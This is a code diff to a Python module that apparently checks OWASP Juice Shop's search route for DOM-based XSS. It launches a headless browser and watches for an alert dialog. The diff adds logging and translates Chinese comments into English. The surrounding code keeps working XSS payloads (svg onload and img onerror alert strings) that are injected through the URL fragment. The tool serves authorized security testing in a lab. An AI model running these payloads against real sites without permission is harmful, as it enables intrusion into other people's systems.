@@ -2,10 +2,12 @@ from __future__ import annotations
 
 import time
 from dataclasses import dataclass
-from typing import Any
 from urllib.parse import quote
 
-from .target import join_url
+from juicechain.utils.logging import get_logger
+
+
+logger = get_logger(__name__)
 
 
 @dataclass
@@ -20,7 +22,7 @@ class DomXssResult:
 
 def build_search_fragment_url(base: str, payload: str) -> str:
     # Juice Shop SPA search route: /#/search?q=...
-    # payload 放在 fragment 的 query 中，需要 URL 编码
+    # payload is passed via hash-fragment query, and must be URL encoded.
     enc = quote(payload, safe="")
     return f"{base}/#/search?q={enc}"
 
@@ -36,10 +38,12 @@ def verify_dom_xss_on_search(
     Only use on authorized targets / local labs.
     """
     t0 = time.time()
+    logger.info("dom-xss browser verification start: base=%s", base)
 
     try:
         from playwright.sync_api import sync_playwright
     except Exception as e:
+        logger.warning("dom-xss browser dependency missing: %s", e)
         return DomXssResult(
             ok=False,
             url="",
@@ -49,7 +53,7 @@ def verify_dom_xss_on_search(
             duration_ms=int((time.time() - t0) * 1000),
         )
 
-    # 多个 payload 轮询，命中一个就算成功（避免过拟合单一 payload）
+    # Try multiple payloads to reduce overfitting to a single case.
     payloads = [
         "\"><svg/onload=alert('JC_DOM_XSS')>",
         "<img src=x onerror=alert('JC_DOM_XSS')>",
@@ -75,11 +79,12 @@ def verify_dom_xss_on_search(
             for payload in payloads:
                 url = build_search_fragment_url(base, payload)
                 page.goto(url, wait_until="networkidle", timeout=timeout_ms)
-                # 给前端一点时间触发事件
+                # Give the frontend a short time window to trigger sink execution.
                 page.wait_for_timeout(800)
 
                 if dialog_msgs:
                     browser.close()
+                    logger.info("dom-xss dialog captured: url=%s", url)
                     return DomXssResult(
                         ok=True,
                         url=url,
@@ -90,6 +95,7 @@ def verify_dom_xss_on_search(
                     )
 
             browser.close()
+            logger.info("dom-xss verification finished without dialog")
             return DomXssResult(
                 ok=False,
                 url=build_search_fragment_url(base, payloads[0]),
@@ -104,6 +110,7 @@ def verify_dom_xss_on_search(
                 browser.close()
             except Exception:
                 pass
+            logger.warning("dom-xss verification runtime error: %s", e)
             return DomXssResult(
                 ok=False,
                 url="",
